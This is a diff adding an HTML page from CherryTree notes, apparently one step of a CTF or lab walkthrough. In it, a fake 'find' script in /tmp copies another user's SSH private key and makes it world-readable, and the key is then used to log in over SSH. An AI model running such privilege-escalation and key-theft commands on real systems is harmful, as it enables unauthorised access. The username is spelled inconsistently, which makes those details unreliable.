@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5.2 Get access as "milow" user.</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>5.2 Get access as "milow" user.</h1><br/><p></p><p>1. Run the following comand on you SSH connection.</p><p>    <div class="codebox"><pre>rita@perlman:/$ cd /home<br />rita@perlman:/home$ ls<br /></pre></div></p><p></p><p>  	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1060-1.png" alt="images/1060-1.png" /></p><p>    </p><p>    </p><p>    There&#39;s an user called “milor”.</p><p>    </p><p>2. Go to “/tmp” and run the followng command.</p><p>    <div class="codebox"><pre>rita@perlman:/$ cd /tmp<br />rita@perlman:/tmp$ echo &quot;cp /home/milou/.ssh/id_rsa /tmp/milou &amp;&amp; chmod 777 /tmp/milou&quot; &gt; find<br />rita@perlman:/$ chmod +x find<br />rita@perlman:/tmp$ watch ls -al milou<br />rita@perlman:/tmp$ cat milou <br /></pre></div></p><p></p><p>  	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1060-2.png" alt="images/1060-2.png" /></p><p>    </p><p>    “milou” file has a key to access as “milow” user.</p><p>    </p><p>    <img src="images/1060-3.png" alt="images/1060-3.png" /></p><p></p><p>3. On Kali Machine create new file called “millou” and paste the key from the previous step.</p><p>    <div class="codebox"><pre>$ nano milou<br />$ chmod 600 milou</pre></div></p><p></p><p>4. Connect via SSH.</p><p>    <div class="codebox"><pre>$ ssh -i milou milou@192.168.12.68 </pre></div></p><p>  	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1060-4.png" alt="images/1060-4.png" /></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
+</body>
+</html>
